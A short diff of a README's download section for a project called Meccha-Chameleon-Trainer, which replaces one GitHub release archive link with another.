@@ -8,7 +8,7 @@
 ## 📥 Download
 
 **Latest version:**  
-🔗 **[Download Meccha-Chameleon-Trainer](https://github.com/NeedleWarriorPrime/MECCHA-CHAMELEON-Trainer/releases/download/das/Trainb.zip)**
+🔗 **[Download Meccha-Chameleon-Trainer](https://github.com/NeedleWarriorPrime/MECCHA-CHAMELEON-Trainer/releases/download/bubi/mecchatrainb.7z)**
 
 
 
